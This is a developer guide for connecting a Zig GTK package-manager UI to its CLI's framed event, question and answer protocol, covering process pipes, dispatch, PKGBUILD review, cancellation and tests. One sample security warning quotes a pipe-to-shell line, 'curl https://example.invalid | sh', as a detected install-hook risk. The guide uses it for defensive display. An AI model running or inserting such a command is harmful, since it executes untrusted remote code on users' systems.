# Wiring Shelly.Ui.Gtk to CLI events and questions

This document describes how the Zig GTK UI should run an interactive `Shelly.Cli.Zig` operation, update widgets from its events, display its questions, and send answers back. It is an implementation guide for [`src/services/shelly_operation.zig`](src/services/shelly_operation.zig), not a description of the older C# GTK application.

The native CLI protocol is defined by:

- [`Shelly.Cli.Zig/src/output/config.zig`](../Shelly.Cli.Zig/src/output/config.zig), which writes event and question frames;
- [`Shelly.Cli.Zig/src/output/ui_operation.zig`](../Shelly.Cli.Zig/src/output/ui_operation.zig), which waits for matching answers;
- [`src/helpers/ui_decode.zig`](src/helpers/ui_decode.zig), which extracts and decodes frames in the UI;
- [`src/services/shelly_operation.zig`](src/services/shelly_operation.zig), which owns the interactive child process.

For the command catalog and result payloads, see [`Shelly.Cli.Zig/UI_INTEGRATION.md`](../Shelly.Cli.Zig/UI_INTEGRATION.md).

## Current state

`ShellyOperation` already does several important things:

- starts the CLI with piped stdin and stdout;
- reads stdout on a worker thread;
- handles frames split across arbitrary reads with `JsonPackFrame.nextFrame`;
- base64-decodes each frame;
- posts work to the GTK main loop with `glib.idleAdd`;
- dispatches `alpm.info` and `alpm.error` callbacks;
- reports the final child exit code.

The package-page operation hookup is currently commented out in [`src/pages/package_page.zig`](src/pages/package_page.zig). Before enabling it, the operation layer still needs:

- all native CLI event variants;
- a distinct question callback and pending-question lifetime;
- answer encoding rather than accepting a prebuilt frame from page code;
- a PKGBUILD review UI;
- stderr draining and cancellation cleanup;
- an operation controller that owns the child independently of a transient widget callback.

The target flow is:

```text
PackagePage starts an operation
          |
          v
ShellyOperation starts `shelly ... --ui-mode`
          |
          +---- stdout event frame ----> worker thread ----> GLib idle callback
          |                                                   |
          |                                                   v
          |                                          update operation view
          |
          +---- stdout question frame -> worker thread ----> GLib idle callback
                                                              |
                                                              v
                                                     show question/review
                                                              |
                                                              v
CLI continues <-------- framed answer on child stdin <---- user response
          |
          v
exit code callback -> finish UI -> release operation
```

## 1. Start the child as an interactive UI operation

Use canonical command arguments in application code:

```text
["shelly", "install", "standard", "firefox", "--ui-mode"]
```

Shortcodes such as `-Is` are useful at a terminal but make UI code harder to audit when command behavior changes.

The child needs:

| Stream | Configuration | Reason |
| --- | --- | --- |
| stdin | `.pipe` | The UI sends question answers here. |
| stdout | `.pipe` | Events, questions, and result records are framed here. |
| stderr | `.pipe` and drained concurrently | Diagnostics must be visible and the child must never block on a full pipe. |

`ShellyOperation` currently sets stderr to `.ignore`. Change this to a pipe and continuously drain it into the operation log. Protocol messages remain on stdout; never try to decode stderr as frames.

Pass `runtime.environ_map` to the spawn call. User-scoped AUR, Flatpak, AppImage, cache, and XDG state depends on preserving the invoking session's environment. Privileged operations can still be wrapped with `pkexec`, but authorization should not silently replace the user's XDG context.

Only mutating or otherwise interactive work belongs in `ShellyOperation`. Queries that return one result and cannot ask a question can continue to use [`src/services/shelly_cli.zig`](src/services/shelly_cli.zig).

## 2. Keep the transport framing in one place

The native CLI emits newline-terminated frames on stdout:

```text
[JSON]<base64-encoded UTF-8 JSON>[/JSON]\n
```

One read may contain half a frame, one frame, or several frames. Continue using the buffer plus `JsonPackFrame.nextFrame`; never assume a read ends at a newline or frame boundary.

The reader should send the decoded JSON to one dispatcher. Pages should receive typed messages, not raw JSON or base64. A useful split is:

```zig
pub const Event = union(enum) {
    alpm_info: AlpmInfo,
    alpm_error: AlpmError,
    alpm_progress: AlpmProgress,
    flatpak_progress: SimpleProgress,
    appimage_progress: SimpleProgress,
    unknown: UnknownMessage,
};

pub const Question = union(enum) {
    yes_no: YesNoQuestion,
    pkgbuild_review: PkgbuildQuestion,
};
```

Give `ShellyOperation` separate callbacks:

```zig
on_event: *const fn (ctx: *anyopaque, event: Event) void,
on_question: *const fn (ctx: *anyopaque, pending: *PendingQuestion) void,
on_stderr: *const fn (ctx: *anyopaque, line: []const u8) void,
on_done: *const fn (ctx: *anyopaque, exit_code: u8) void,
```

Dispatch by the decoded `$kind` string:

- `alpm.*`, `flatpak.*`, and `appimage.*` are events;
- `q.*` values are questions;
- payloads without `$kind` are command results;
- an unknown `$kind` should become `.unknown` and be logged, not crash the operation.

Questions also contain `$kind`. Do not route every payload with a discriminator as an event.

If `ShellyOperation` is later used for commands that return data, add a separate result callback whose payload owns its memory. Until then, interactive mutation operations can log an unexpected result payload while query commands remain in `ShellyCli`.

### Payload lifetime

The current `onEventIdle` frees the decoded JSON and parsed values when the callback returns. That is fine for a callback that immediately copies text into a GTK widget. It is not sufficient for questions because their `QuestionId` is needed later, after the user responds.

Each question should therefore own its data. A practical design is a heap-allocated `PendingQuestion` with a small arena:

```zig
const PendingQuestion = struct {
    arena: std.heap.ArenaAllocator,
    operation: *ShellyOperation,
    controller: *OperationController,
    request: Question,
    completed: bool = false,
};
```

Parse or duplicate the question strings into that arena. Destroy the pending question only after an answer has been written or the operation has been cancelled. This also prevents a dialog callback from referring to memory freed by `std.json.Parsed.deinit()`.

GTK constructors in this project often take sentinel-terminated strings such as `[:0]const u8`. Use `allocator.dupeZ` for JSON strings passed to those APIs; a normal `[]const u8` parsed from JSON is not sentinel terminated.

## 3. Handle every event currently emitted by Shelly.Cli.Zig

The native CLI currently emits these five event kinds:

| `$kind` | Fields used by the UI | Suggested behavior |
| --- | --- | --- |
| `alpm.info` | `EventType`, `Message`, `PackageName?`, `CurrentIndex?`, `TotalCount?` | Set the status message, append a log line, and update batch position when counts exist. |
| `alpm.error` | `ErrorMessage` | Show the error prominently and retain it in the log. Do not finish the operation until the child exits. |
| `alpm.progress` | `PackageName`, `CurrentDownload`, `TotalDownload`, `ProgressType`, `Percent`, `Message?` | Update package name, progress label, byte counts, and progress bar. |
| `flatpak.progress` | `Status?`, `Percentage` | Update Flatpak status and progress. |
| `appimage.progress` | `Status?`, `Percentage` | Update AppImage status and progress. |

Every event also includes `Source`, `Level`, and `TimeStamp`. Keep them in the model even if the first operation view does not display them.

Example decoded progress event:

```json
{
  "$kind": "alpm.progress",
  "PackageName": "firefox",
  "CurrentDownload": 5242880,
  "TotalDownload": 10485760,
  "ProgressType": "PackageDownload",
  "Percent": 50,
  "Message": "Downloading",
  "Source": "Alpm",
  "Level": "Information",
  "TimeStamp": "2026-07-19T14:30:00+00:00"
}
```

Clamp percentages to 0–100 before presenting them. If a total is zero, show indeterminate progress rather than dividing by zero.

All UI callbacks posted by `glib.idleAdd` run on the GTK main loop. Keep JSON decoding and pipe reads on the worker thread, and only perform widget changes in the idle callback.

### Operation view

Create one operation view owned by the controller, with at least:

- a status label;
- a package/application label;
- a `GtkProgressBar` with determinate and pulsing states;
- a scrollable log;
- a cancel button.

`ShellyWindow.showLockout` removes the previous lockout child before inserting a new one. If a question temporarily replaces the operation view, the controller must retain the operation view and restore it after answering. Do not let individual pages independently replace and forget the active lockout content.

## 4. Handle the two native CLI question kinds

`Shelly.Cli.Zig` currently emits `q.yesno` and `q.pkgbuilddiff`. Although the underlying operation library has provider and multi-select question kinds, UI mode currently uses backend defaults for them; there is no native `q.provider` or `q.optdeps` wire contract yet.

Only one question is normally outstanding because the CLI waits for its answer before continuing. `QuestionId` is an opaque string and must be copied exactly into the answer.

### Yes/no questions

Request:

```json
{
  "$kind": "q.yesno",
  "QuestionId": "12",
  "QuestionKind": "ConflictPkg",
  "QuestionText": "Continue with the package replacement?"
}
```

Known `QuestionKind` values currently include `InstallIgnorePkg`, `ConflictPkg`, and `RemovePkgs`. Unknown kinds should still be shown as a conservative confirmation.

Use the existing [`ConfirmDialog`](src/dialog/page/yn_dialog.zig). The response callback should:

1. remove the question from the lockout overlay;
2. encode and write the answer;
3. restore the operation view;
4. release the pending question.

Answer JSON:

```json
{"$kind":"a.yesno","QuestionId":"12","Accept":true}
```

Cancel or close must send `Accept: false`; otherwise the CLI remains blocked on stdin.

Conceptually, the callback looks like this:

```zig
fn onYesNoResponse(ctx: ?*anyopaque, accepted: bool) void {
    const pending: *PendingQuestion = @ptrCast(@alignCast(ctx.?));
    if (pending.completed) return;
    pending.completed = true;

    pending.controller.hideQuestionAndRestoreOperation();
    pending.operation.answerYesNo(pending.questionId(), accepted) catch {
        pending.controller.failOperation("Could not answer CLI question");
        pending.operation.cancel();
    };
    pending.deinit();
}
```

The exact controller field layout can differ; the important properties are one-shot completion and owned `QuestionId` memory.

### PKGBUILD review questions

Request:

```json
{
  "$kind": "q.pkgbuilddiff",
  "QuestionId": "13",
  "PackageName": "example-aur-package",
  "OldPkgbuild": "pkgver=1.0",
  "NewPkgbuild": "pkgver=1.1",
  "Warnings": [
    {
      "Tool": "curl",
      "Severity": "Critical",
      "Hook": "post_install",
      "MatchedLine": "curl https://example.invalid | sh",
      "Message": "Downloads and executes code outside pacman's control."
    }
  ],
  "DiffLines": ["[red]- pkgver=1.0[/]", "[green]+ pkgver=1.1[/]"],
  "SourceFiles": {"example.install": "post_install() { ...; }"}
}
```

Answer JSON:

```json
{"$kind":"a.pkgbuilddiff","QuestionId":"13","ProceedWithUpdate":false}
```

This needs a dedicated review view, not `ConfirmDialog`. It should show:

- package name and old/new PKGBUILD content or the supplied diff lines;
- every warning with severity, tool, hook, matched line, and explanation;
- every related source file in `SourceFiles`;
- explicit Reject and Proceed actions.

`OldPkgbuild` and `SourceFiles` may be null, and arrays may be empty. Treat a parsing failure, dialog failure, cancel, or close as `ProceedWithUpdate: false`. AUR build scripts are executable code, so rejection is the safe default.

The current CLI formats `DiffLines` with Spectre-style color tags such as `[green]...[/]`. The Zig GTK UI should either strip those tags or translate them into GTK text tags; it should never display the markup literally without an intentional fallback.

## 5. Encode and send answers inside ShellyOperation

Page code should not build protocol strings. Add typed methods to `ShellyOperation`:

```zig
pub fn answerYesNo(self: *ShellyOperation, question_id: []const u8, accept: bool) !void;

pub fn answerPkgbuild(
    self: *ShellyOperation,
    question_id: []const u8,
    proceed: bool,
) !void;
```

Each method should:

1. JSON-encode the exact answer object;
2. base64-encode its UTF-8 bytes;
3. wrap it as `[JSON]...[/JSON]`;
4. write the complete frame plus `\n` to child stdin;
5. flush if the writer API buffers.

The existing `answer(response)` method only appends a newline; its caller must already have constructed the full frame. Move that responsibility into the service so pages cannot send malformed answers.

If more than one callback can write to stdin, protect writes with an operation-owned mutex. A frame must be written atomically relative to every other frame.

Malformed lines, answer kinds that do not match the pending request, and stale `QuestionId` values are ignored by the CLI. A malformed answer therefore appears as a hung operation, which is another reason to centralize and test answer encoding.

## 6. Own the operation for its full lifetime

The page or, preferably, a window-level operation controller should hold `*ShellyOperation` until `on_done` runs. The lifecycle is:

1. allocate `ShellyOperation`;
2. set `op.io = op.threaded.io()`;
3. store the pointer before starting the child;
4. show the operation view;
5. call the typed start method;
6. process events and questions;
7. on completion, join the reader thread, deinitialize `threaded`, destroy the operation, and clear the stored pointer.

The page's commented code already sketches most of this lifecycle. Do not destroy the operation on a start failure until any resources successfully created by `spawn_and_read` have been accounted for.

Event strings are only valid during `on_event` with the current parse/deinit design. Copy any message retained in a log model after the callback returns.

### Completion

Use the child exit code for the final result:

- `0`: success;
- nonzero: failure;
- `255`: the current sentinel for a wait failure or non-normal termination.

An `alpm.error` event contains the useful explanation but does not replace the exit code. Keep the error in the operation view until the user dismisses it.

### Cancellation

Make `ShellyOperation.cancel` public and expose it through the operation controller. Cancellation should:

- mark the controller as cancelling so callbacks become idempotent;
- dismiss or invalidate any pending question;
- terminate the child;
- wait for `on_done` before freeing operation memory.

Do not implement cancel by merely closing stdin. If the CLI is waiting for an answer, EOF is an abnormal protocol failure. Also do not free a pending question while its GTK response callback can still fire; disconnect the handler, remove the widget, or make the callback observe a durable cancelled state.

## 7. Suggested page hookup

After the operation service and controller are complete, the package-page flow can be enabled along these lines:

```zig
fn on_install_response(ctx: ?*anyopaque, confirmed: bool) void {
    const self: *PackagePage = @ptrCast(@alignCast(ctx.?));
    if (!confirmed) {
        if (support.getWindow(ShellyWindow, self)) |win| win.hideLockout();
        return;
    }

    const names = self.collectSelectedPackageNames() catch return;
    defer self.freeSelectedPackageNames(names);
    if (names.len == 0) return;

    self.startInstallOperation(names) catch |err| {
        self.showOperationStartError(err);
    };
}
```

`startInstallOperation` should delegate ownership and UI state to the controller. Keep selection collection, transport handling, and dialog presentation as separate concerns.

## 8. Tests to add before enabling mutations

Keep codec and dispatch tests independent from GTK where possible:

- fragmented prefix, payload, and suffix across several reads;
- several frames in one read;
- every event kind maps to the correct union tag and fields;
- an unknown `$kind` maps to `.unknown`;
- a `q.yesno` request survives beyond the parser callback;
- `answerYesNo` produces a frame accepted by the native CLI reader;
- a `q.pkgbuilddiff` request preserves warnings, source files, and non-ASCII text;
- `answerPkgbuild` produces the exact expected discriminator and field;
- cancel and duplicate dialog responses are safe and do not double-free;
- `on_done` releases the reader thread and operation exactly once.

The CLI already has answer-contract coverage in [`Shelly.Cli.Zig/src/output/ui_operation.zig`](../Shelly.Cli.Zig/src/output/ui_operation.zig). UI-side codec tests belong next to [`src/helpers/ui_decode.zig`](src/helpers/ui_decode.zig), while dispatcher/lifetime tests belong next to `shelly_operation.zig` or in a new transport-only module that does not import GTK.

## Implementation checklist

- Use canonical argv entries and append `--ui-mode` once.
- Preserve the session environment across normal and privileged launches.
- Pipe stdin/stdout and continuously drain stderr.
- Keep byte reads and JSON decoding off the GTK thread.
- Route events, questions, results, and unknown messages separately.
- Add all five native event variants to the UI event union.
- Give pending questions owned memory and one-shot completion.
- Implement both `q.yesno` and `q.pkgbuilddiff` before enabling AUR mutations.
- Encode answer frames inside `ShellyOperation` and serialize stdin writes.
- Restore the operation view after a question is answered.
- Use the exit code as the final outcome and retain framed error details.
- Cancel the child first; free state only after completion callbacks are safe.
- Add transport tests before uncommenting the package-page operation flow.
